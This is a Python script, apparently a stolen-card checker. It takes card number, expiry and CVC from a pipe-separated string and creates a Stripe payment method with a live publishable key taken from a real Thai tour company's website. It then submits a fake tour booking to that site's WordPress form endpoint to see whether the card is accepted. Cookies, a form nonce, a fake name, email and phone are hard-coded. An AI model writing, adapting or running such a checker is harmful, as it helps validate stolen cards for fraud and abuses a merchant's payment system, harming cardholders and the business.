import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F11beb56b35%3B+stripe-js-v3%2F11beb56b35%3B+card-element&referrer=https%3A%2F%2Fwww.aboveandbeeyondtours.com&time_on_page=87648&key=pk_live_51Neh42Kttuxx9wmt7yqEfz8BmbjTXcU5OtAV5yjiTSgKpDvPUFpnGIg1CJvjUuAn7D6GGxXbr3VBFtUn95U0wJGp00O9lOXGKl'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.1623605300.1737356759',
	    '__stripe_mid': '4381f792-14d8-4775-978e-22f01cbfec9e415526',
	    'chatyWidget_0': '[{"k":"v-widget","v":"2025-01-30T09:20:08.561Z"}]',
	    'activechatyWidgets': '0',
	    '__stripe_sid': 'fdd65137-1bee-478d-90b8-853bbb1acde5d2fe79',
	    '_ga_XMBRQF4SGR': 'GS1.1.1738228809.3.0.1738228817.52.0.0',
	    '_ga_25EM144R5E': 'GS1.1.1738228809.3.0.1738228817.0.0.0',
	}
	
	headers = {
	    'authority': 'www.aboveandbeeyondtours.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1623605300.1737356759; __stripe_mid=4381f792-14d8-4775-978e-22f01cbfec9e415526; chatyWidget_0=[{"k":"v-widget","v":"2025-01-30T09:20:08.561Z"}]; activechatyWidgets=0; __stripe_sid=fdd65137-1bee-478d-90b8-853bbb1acde5d2fe79; _ga_XMBRQF4SGR=GS1.1.1738228809.3.0.1738228817.52.0.0; _ga_25EM144R5E=GS1.1.1738228809.3.0.1738228817.0.0.0',
	    'origin': 'https://www.aboveandbeeyondtours.com',
	    'referer': 'https://www.aboveandbeeyondtours.com/tours/krabi-to-similan-islands-tour/?srsltid=AfmBOopIJbiJ0r5yKH37_kprx6IW4dV2PZlHyIQ_FHGO8by5LDcrMiiJ',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1738228896553',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=5049&_fluentform_3_fluentformnonce=d81807a50d&_wp_http_referer=%2Ftours%2Fkrabi-to-similan-islands-tour%2F%3Fsrsltid%3DAfmBOopIJbiJ0r5yKH37_kprx6IW4dV2PZlHyIQ_FHGO8by5LDcrMiiJ&tour_name=Krabi%20to%20Similan%20Islands%20Tour&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=2084359362&hotel_name=Khaosan&price_types=variable_price&tour_price=&adult_price=3950&child_price=3550&number_adult=1&number_child=1&has_min_max=&min_per_tour=2&max_per_tour=6&booking_date=31%2F01%2F2025&has_tour_time=&has_transfer=1&message=&totalprice=10&payment_method=stripe&terms_condition=on&transfer_pickup=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://www.aboveandbeeyondtours.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
